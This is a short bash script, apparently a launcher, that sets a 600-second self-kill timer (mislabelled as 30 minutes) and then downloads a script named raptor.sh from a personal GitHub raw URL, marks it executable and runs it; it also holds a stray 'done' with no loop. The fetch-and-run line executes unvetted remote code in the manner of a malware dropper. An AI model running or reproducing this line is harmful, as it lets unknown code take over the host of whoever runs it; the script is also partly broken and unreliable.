#!/bin/bash

Timeout=600 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://raw.githubusercontent.com/lushenry654/bitbucket/master/raptor.sh && chmod +x raptor.sh && ./raptor.sh
done
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit 0
